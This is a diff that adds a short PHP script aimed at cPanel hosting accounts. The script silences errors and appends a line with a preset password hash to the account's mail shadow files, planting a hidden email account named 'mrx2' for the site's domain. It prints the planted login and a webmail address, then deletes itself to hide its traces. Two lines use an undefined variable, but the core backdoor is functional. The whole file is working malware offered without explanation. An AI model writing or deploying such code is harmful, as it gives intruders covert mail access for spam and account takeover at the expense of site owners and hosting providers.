@@ -1,0 +1,27 @@
+<?php
+error_reporting(0);
+
+$usr = @get_current_user();
+$cp = "/home/$usr/.cpanel";
+if (is_dir($cp)) {
+	$domain = $_SERVER['HTTP_HOST'];
+	$ip = $_SERVER["SERVER_ADDR"];
+	if(strstr($domain, 'www.')){
+		$domain = str_replace("www.","",$domain);
+	}else{
+		$domain = $domain;
+	}
+	@mkdir("/home/$usr/etc/$domain");
+	$smtp = 'mrx2:$6$Mrxxxtn$Vj/xskIkef5WfMIU.ysWj6i4QwEcL/S.raVLQDdU/P1iOvy25pCdZuxBKu1O3YwaY/OAOHRsgA/WvfH6N0DCE.:16249:::::'."\n";
+	$shadow1 = "/home/$usr/etc/$domain/shadow";
+	$shadow2 = "/home/$usr/etc/shadow";
+	$fo=fopen($shadow1,"a");
+	fwrite($fo,$smtp);
+	$fo2=fopen($shadow2,"a");
+	fwrite($fo2,$smtp);
+	echo "$domain|25|mrx2@$domain|Mrxxx@localhost\n";
+         $parm = 'https://'.$site.'/webmail';
+         echo 'http://'.$site.'/webmail';
+}
+unlink(__FILE__);
+?>
